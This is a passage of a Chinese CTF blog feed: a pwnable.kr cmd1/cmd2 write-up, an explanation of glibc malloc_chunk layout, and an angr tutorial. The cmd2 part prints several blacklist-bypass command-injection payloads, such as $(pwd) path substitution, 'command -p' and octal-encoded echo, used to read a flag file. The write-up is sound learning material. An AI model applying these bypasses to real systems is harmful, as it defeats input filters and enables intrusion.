src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201210815614.png"></p></li><li><p>在创建bash文件，文件名字里面千万不能带有过滤字符（我踩了这个坑😥），然后写入命令</p></li></ul><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212309793.png"></p><ul><li> 让程序调用文件，一样可以达到效果</li></ul><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212435273.png"></p><h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210201212556897.png"></p><p>cmd2的考点与cmd1大同小异，只是这一次源码中过滤了更多的字符，需要更高的技巧才能绕过字符过滤检测拿到flag，下面贴源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这次程序直接过滤了’/‘,’.’之类的符号，连路径都不让使用💔 下面我提供几种种方法（网上看到总结的，学习一手）</p><h4 id="利用pwd"><a href="#利用pwd" class="headerlink" title="利用pwd"></a>利用pwd</h4><p>利用$，我们可以进入到根目录，用$(pwd)来代替’/‘</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202002742365.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">/home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;</span><br><span class="line">/home/cmd2/cmd2 &quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202001835043.png"></p><p>上面两种写法都可以，这是linux中双引号和单引号的区别，下面这篇文章可以了解他们之间的区别</p><p><a href="https://blog.csdn.net/u014636245/article/details/82919144">Linux中单引号双引号的区别与用法</a></p><h4 id="command-p"><a href="#command-p" class="headerlink" title="command -p"></a>command -p</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;command -p&#x27; //这条命令会强制将环境变为默认值，就不用使用绝对路径</span><br><span class="line">./cmd2 &#x27;command -p cat f*&#x27;</span><br></pre></td></tr></table></figure><h4 id="echo解析8进制与16进制"><a href="#echo解析8进制与16进制" class="headerlink" title="echo解析8进制与16进制"></a>echo解析8进制与16进制</h4><p>在网上看别人wp学的其实我觉得原理和第一个差不太多，这个是利用echo可以解析16进制和8进制表示的字符串（但是不能用参数 -e），具体情况要看系统版本。（我在网上看到他们在远程服务器上echo命令可以解释8进制，但我试了试就不行，还是记录下这个方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 /bin/cat flag 转化为8进制</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd = <span class="string">&quot;/bin/cat flag&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\\&quot;</span>+<span class="string">&quot;\\&quot;</span>.join([<span class="built_in">oct</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ordlist(cmd)]))</span><br><span class="line"><span class="comment"># \057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>我的本地虚拟机就不可以直接用echo命令转，需要参数-e</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210202000852202.png"></p><h4 id="set-s"><a href="#set-s" class="headerlink" title="set -s"></a>set -s</h4><p>具体的原理还没有在网上找到，等后面补充</p><p><a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash 脚本 set 命令教程</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;set -s&#x27;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">/bin/cat flag</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>shell编程点都不会，其实上学期学了的，只是上网课一点都没有认真听。。想在想起来有点傻，后面需要补习下shell的知识</p></li><li><p>linux的东西太灵活了。。其实上面的两道题还有几种其他的方法，但是我精力和时间有限，只收集了几种我感觉还可以的方法</p></li><li><p>我太菜了。。🐹</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h3 id=&quot;cmd1&quot;&gt;&lt;a href=&quot;#cmd1&quot; class=&quot;headerlink&quot; title=&quot;cmd1&quot;&gt;&lt;/a&gt;cmd1&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/view/</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc_chunk结构体</title>
    <link href="http://example.com/19484/"/>
    <id>http://example.com/19484/</id>
    <published>2021-07-14T04:44:16.790Z</published>
    <updated>2022-01-01T09:56:38.395Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。</p><h2 id="malloc-chunk结构体成员解析"><a href="#malloc-chunk结构体成员解析" class="headerlink" title="malloc_chunk结构体成员解析"></a>malloc_chunk结构体成员解析</h2><p><code>malloc_chunk</code>结构定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="各个成员的作用"><a href="#各个成员的作用" class="headerlink" title="各个成员的作用"></a>各个成员的作用</h3><ol><li><p><code>prev_size</code></p><ul><li>如果该<code>chunk</code>物理地址相邻的前一<code>chunk</code>(两个指针的差值为前一个chunk大小)是空闲的<code>chunk</code>，这个字段记录的是前一个字符段的大小</li><li>用于储存物理地址相邻的<code>chunk</code>(低地址chunk)的信息</li><li>被共享，如果当前<code>chunk</code>大不够用，可以占用下一个<code>chunk</code>的<code>prev_size</code>字段</li></ul></li><li><p><code>size</code></p><ul><li><p>存储当前<code>chunk</code>的大小，chunk的大小内存申请，与<code>SIZE_SZ</code>有关，如果不是<code>2*SIZE_SZ</code>的整数倍，会自动向上取整到<code>2*SIZE_SZ</code>的整数倍，32位操作系统中<code>SIZE_SZ</code>是32位4个字节，64位操作系统中<code>SIZE_SZ</code>是64位8个字节。32位必须8字节对齐，64位必须16字节对齐，无论32位还是64位，<code>size</code>最后三位都没有用，所用可以用来存储其他信息</p><ul><li><p><strong>NON_MAIN_ARENA</strong></p></li><li><p><strong>IS_MAPPED</strong></p><p>记录当前chunk是否是由<code>mmap</code>申请</p></li><li><p><strong>PREV_INUSE</strong></p><p>记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul></li><li><p><code>fd</code>和<code>bk</code></p><ul><li>chunk处于分配状态时，fd地址段存放的是用户数据。chunk在空闲的时候通过链表管理</li><li><code>fd</code>指向上一个空闲（非物理空闲）的chunk</li><li><code>bk</code>指向下一个空闲（非物理空闲）的chunk</li></ul></li><li><p><code>fd_nextsize</code>和<code>bk_nextsize</code></p><p>- </p></li></ol><ul><li><p>chunk被使用时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, <span class="keyword">in</span> <span class="built_in">bytes</span>                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() <span class="built_in">bytes</span>)                      .</span><br><span class="line"><span class="built_in">next</span>    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of <span class="built_in">next</span> chunk, <span class="keyword">in</span> <span class="built_in">bytes</span>                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li><li><p>chunk被释放时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:<span class="string">&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="string">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">        .                                                               .</span></span><br><span class="line"><span class="string"> next   .                                                               |</span></span><br><span class="line"><span class="string">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">`foot:&#x27;</span> |             Size of chunk, <span class="keyword">in</span> <span class="built_in">bytes</span>                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of <span class="built_in">next</span> chunk, <span class="keyword">in</span> <span class="built_in">bytes</span>                |A|<span class="number">0</span>|<span class="number">0</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li></ul><h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><p>malloc函数申请的chunk地址都是8字节或者16字节对齐（32位8字节，64位16字节），所谓字节对齐，就是所有的地址最后8位或16位都是一样的（大多数时候为8的整数倍），常见的内存对齐有8字节对齐和16字节对齐</p><ul><li><p>8字节对齐</p><p>地址的最后8位（2进制位）10进制表示为8</p></li><li><p>16字节对齐</p><p>地址的最后8位（2进制位）10进制表示为0</p></li></ul><p>下面用pwndbg展示32位下chunk内存结构</p><h3 id="pwndbg分析chunk在内存中的结构"><a href="#pwndbg分析chunk在内存中的结构" class="headerlink" title="pwndbg分析chunk在内存中的结构"></a>pwndbg分析chunk在内存中的结构</h3><p>测试源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ptr1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr3 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr4 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr5 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr6 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr1-&gt;%p\n&quot;</span>, ptr1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr2-&gt;%p\n&quot;</span>, ptr2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr3-&gt;%p\n&quot;</span>, ptr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr4-&gt;%p\n&quot;</span>, ptr4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr5-&gt;%p\n&quot;</span>, ptr5);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr6-&gt;%p\n&quot;</span>, ptr6);</span><br><span class="line">        <span class="built_in">free</span>(ptr1);</span><br><span class="line">        <span class="built_in">free</span>(ptr2);</span><br><span class="line">        <span class="built_in">free</span>(ptr3);</span><br><span class="line">        <span class="built_in">free</span>(ptr4);</span><br><span class="line">        <span class="built_in">free</span>(ptr5);</span><br><span class="line">        <span class="built_in">free</span>(ptr6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>32位程序</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212183615924.png" alt="32位程序malloc申请地址"></p></li><li><p>64位程序</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212183727096.png" alt="64位程序malloc申请地址"></p></li><li><p>heap命令查看所有堆信息</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212184244904.png"></p></li><li><p>分析二进制数据</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212195957160.png"></p><p>64位程序chunk结构与之类似</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。&lt;/p&gt;
&lt;h2 id=&quot;malloc-chunk结构体成员解析&quot;&gt;&lt;a href=&quot;#malloc-chunk结构体成员解析&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>angr-1</title>
    <link href="http://example.com/17540/"/>
    <id>http://example.com/17540/</id>
    <published>2021-07-14T04:44:16.720Z</published>
    <updated>2022-01-01T10:53:07.505Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="ctf-angr"><a href="#ctf-angr" class="headerlink" title="ctf_angr"></a>ctf_angr</h2><p>一个用于练习angr的ctf题库，从入门到进阶，同时配套全英文ppt，从符号执行到angr详细使用方式，一站式入门👍</p><p>GitHub下载地址[<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM">链接</a>]</p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>伪代码非常简单,执行流程为：输入-&gt;加密-&gt;比较-&gt;输出，分支少，所以遍历起来速度很快</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211150156381.png"></p><p>伪代码易读，数据的字符串经过complex_function函数加密过后比较。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211150039313.png" alt="main_function"></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211150407696.png" alt="complex_function"></p><p>如果按照传统的方法，需要逆加密算法然后写出解密算法，但是angr不需要这些繁琐的操作，只需要告诉其实地址和目标地址，angr就会进行所有遍历，对符号进行约束，从而得出结果。</p><h3 id="angr遍历求解"><a href="#angr遍历求解" class="headerlink" title="angr遍历求解"></a>angr遍历求解</h3><p>首先贴出全代码以及运行结果，最后打印的值就是对符号不断约束求解得到的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/桌面/00_angr_find&#x27;</span></span><br><span class="line"></span><br><span class="line">project = angr.Project(filepath)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">print_good_addr = <span class="number">0x0804867D</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find = print_good_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211150835527.png"></p><p>使用angr过程</p><ol><li><p>创建项目</p><p>首先用Project函数创建一个项目，Project参数为需要求解的二进制文件路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">project = angr.Project(filepath)</span><br></pre></td></tr></table></figure></li><li><p>告诉angr从哪儿开始执行</p><p>entry_state()表明从main函数开始执行（从头开始执行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initial_state = project.factory.entry_state()</span><br></pre></td></tr></table></figure></li><li><p>创建模拟管理器</p><p>simgr是创建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></figure></li><li><p>开始探索二进制文件</p><p>explore函数需要遍历的结束地址，也就是这个二进制程序中打印字符串**Good Job.**的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_good_address = <span class="number">0x0804867D</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br></pre></td></tr></table></figure></li><li><p>检查是否找到了解决方案</p><p>如果找到解决方案，found不为空（在pyhon中空代表false，不为空代表true）,将解决方案打印到屏幕输出端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">   solution_state = simulation.found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li></ol><h3 id="总结主要过程"><a href="#总结主要过程" class="headerlink" title="总结主要过程"></a>总结主要过程</h3><p>创建工程 –&gt; 指定执行入口 –&gt; 创建二进制文件执行模拟器 –&gt; 探索各个分支 –&gt; 解出解决方案 –&gt; 打印结果</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>​        这一次的文件较大，main函数在ida中不能F5，即便F5过后也可能因为伪代码较复杂无法阅读，所以在简单观察过后可以直接用angr看是否有解，但是作者这次在程序中加了一点料，方便我们学习avoid参数</p><p>should_succeed这个变量初始值为1本身并没有问题但是avoid_me函数会将should_succeed赋值为0。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211161539597.png"></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211161257626.png"></p><p>​        所以这个如果要打印出**Good Job.**需要两个条件同时满足（should_succeed值为1，且输入的字符串加密过后满足条件），如果在遍历时不添加avoid条件会花费大量的时间（虽然结果一样），为了尽可能的节约时间，需要在遍历时避免avoid_me函数，所以在上一个的条件下，需要在添加其他条件，这里需要添加avoid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avoid_addr = <span class="number">0x080485A8</span> <span class="comment"># avoid_me函数地址</span></span><br><span class="line">simgr.explore(find = good_addr, avoid = avoid_addr) <span class="comment"># 添加avoid条件</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211162409904.png"></p><h2 id="02-angr-condtion"><a href="#02-angr-condtion" class="headerlink" title="02_angr_condtion"></a>02_angr_condtion</h2><p>出了在ida中直接寻找字符串地址，还可以自定义函数遍历所有字符串，寻找需要的字符串地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 